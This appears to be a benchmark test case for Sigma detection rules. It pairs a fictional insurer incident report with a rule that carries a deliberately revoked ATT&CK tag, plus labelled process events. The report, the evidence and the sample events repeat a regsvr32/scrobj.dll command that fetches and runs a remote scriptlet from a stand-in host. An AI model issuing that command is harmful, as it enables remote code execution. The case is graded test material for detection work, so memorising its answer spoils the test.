@@ -1,0 +1,111 @@
+id: D8-02
+role: defective
+defect_class: D8
+evasive: false
+why: The tag attack.t1117 is a revoked/deprecated ATT&CK ID (Regsvr32 was folded into T1218.010), so it
+  is not active in the pinned release and is not the technique the report cites. The tactic attack.stealth
+  and the detection logic are correct.
+expected_gate: G7
+report_text: 'Incident summary, Brackenridge Mutual (fictional insurer). After a user enabled macros in
+  a received claims form, the Word process started a signed Windows binary to fetch and run a remote scriptlet
+  without writing a DLL to disk. Responders recovered this command line: regsvr32.exe /s /n /u /i:http://files.brackenridge-docs.test/p.sct
+  scrobj.dll and noted that the parent process was WINWORD.EXE. The scriptlet launched a small downloader
+  which contacted the same staging host. Analysts stressed that the abuse is of regsvr32 loading scrobj.dll
+  with an HTTP location passed to the /i switch; ordinary use of regsvr32 to register a local COM library
+  does not use that combination. The behaviour was seen on four hosts, with the staging path differing
+  slightly on each. No other signed-binary proxies were observed in the same time window, and no credential
+  access or persistence was linked to this step.'
+evidence:
+- regsvr32.exe /s /n /u /i:http://files.brackenridge-docs.test/p.sct scrobj.dll
+- regsvr32 loading scrobj.dll with an HTTP location passed to the /i switch
+logsource: windows_process_creation
+techniques:
+- T1218.010
+sigma_yaml: |
+  title: Regsvr32 Remote Scriptlet Execution via Scrobj
+  id: a91d7e34-52c6-4f18-b0a3-6d84e2c97f15
+  status: experimental
+  description: Detects regsvr32 loading scrobj.dll with an HTTP location supplied to the /i switch.
+  references:
+    - urn:atidep:case
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.stealth
+    - attack.t1117
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection:
+      Image|endswith: '\regsvr32.exe'
+      CommandLine|contains|all:
+        - 'scrobj.dll'
+        - '/i:http'
+    condition: selection
+  falsepositives:
+    - Software installers that register COM scriptlets from an internal web server
+  level: high
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\regsvr32.exe
+    cmd: regsvr32.exe /s /n /u /i:http://files.brackenridge-docs.test/p.sct scrobj.dll
+    parent: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+    parent_cmd: WINWORD.EXE /n C:\Users\carol\Documents\claim-form.docm
+    user: LAB\carol
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\SysWOW64\regsvr32.exe
+    cmd: regsvr32 /s /n /u /i:http://files.brackenridge-docs.test/q7.sct scrobj.dll
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\dan
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\ping.exe
+    cmd: ping.exe -n 2 192.0.2.10
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\dan
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\mspaint.exe
+    cmd: mspaint.exe
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\carol
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\regsvr32.exe
+    cmd: regsvr32.exe /s C:\Vendor\Viewer\cviewer.dll
+    parent: C:\Windows\System32\msiexec.exe
+    parent_cmd: msiexec.exe /V
+    user: NT AUTHORITY\SYSTEM
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\regsvr32.exe
+    cmd: regsvr32.exe /u /s C:\Windows\System32\msxml3.dll
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\svc-deploy
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
